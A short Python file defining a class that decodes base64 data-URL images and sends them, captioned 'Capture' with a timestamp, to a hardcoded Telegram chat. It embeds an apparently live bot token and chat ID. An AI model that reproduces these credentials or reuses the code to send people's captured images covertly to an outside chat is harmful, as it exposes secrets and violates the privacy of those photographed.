import requests
import base64
import io
from PIL import Image
import time

class TelegramBot:
    def __init__(self):
        self.token = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
        self.chat_id = "6673230400"
        self.base_url = f"https://api.telegram.org/bot{self.token}"
    
    def send_photo(self, image_data):
        """Send photo to Telegram"""
        try:
            # Decode base64 image
            image_bytes = base64.b64decode(image_data.split(',')[1])
            
            # Send to Telegram
            url = f"{self.base_url}/sendPhoto"
            files = {'photo': ('capture.jpg', image_bytes, 'image/jpeg')}
            data = {'chat_id': self.chat_id, 'caption': f'Capture: {time.strftime("%Y-%m-%d %H:%M:%S")}'}
            
            response = requests.post(url, files=files, data=data)
            return response.json()
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            return None
